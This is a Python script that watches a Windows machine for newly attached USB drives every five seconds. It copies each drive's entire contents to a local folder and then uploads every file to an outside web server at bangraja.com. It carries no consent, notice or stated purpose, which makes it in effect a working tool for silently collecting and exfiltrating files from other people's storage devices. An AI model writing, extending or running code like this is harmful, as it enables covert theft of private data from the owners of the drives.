import os
import shutil
import time
import requests

# Specify the directory to copy the USB contents to 
destination_dir = "D:/USB/"


def upload_file(file_path, url):
    with open(file_path, 'rb') as f:
        files = {'file': (os.path.basename(file_path), f)}
        relative_path = os.path.relpath(os.path.dirname(file_path), os.getcwd()).replace("\\", "/")
        data = {'relative_path': relative_path}
        response = requests.post(url, files=files, data=data)
        return response

def upload_directory(directory_path, url):
    for root, _, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            print(f'Uploading {file_path}...')
            response = upload_file(file_path, url)
            if response.status_code == 200:
                print(f'Successfully uploaded {file_path}')
            else:
                print(f'Failed to upload {file_path}, status code: {response.status_code}')

def copy_usb_contents(destination_dir):
    # Get list of drives currently connected
    drives = [drive for drive in os.popen("wmic logicaldisk get caption").read().split() if len(drive) == 2 and drive[1] == ":"]
    
    # Filter out C:/ and D:/
    usb_drives = [drive for drive in drives if drive not in ["C:", "D:"]]

    if not usb_drives:
        print("No USB drives detected.")
        return

    for usb_drive in usb_drives:
        print(f"Copying contents of {usb_drive} to {destination_dir}...")
        try:
            # Create a unique destination folder for each USB drive
            drive_label = usb_drive.replace(":", "")
            unique_destination = os.path.join(destination_dir, drive_label)
            
            if not os.path.exists(unique_destination):
                os.makedirs(unique_destination)
                
            # Copy files from USB drive to destination directory
            shutil.copytree(usb_drive, unique_destination, dirs_exist_ok=True)
            print("Copy completed successfully.")
            
            directory_path = unique_destination  # Change this to the directory you want to upload
            server_url = 'http://bangraja.com/UPS/plz.php'  # Change this to your server's upload URL
            upload_directory(directory_path, server_url)
        except Exception as e:
            print(f"Error occurred while copying: {str(e)}")

if __name__ == "__main__":
    while True:
        # Check for USB drive every 5 seconds
        copy_usb_contents(destination_dir)
        time.sleep(5)
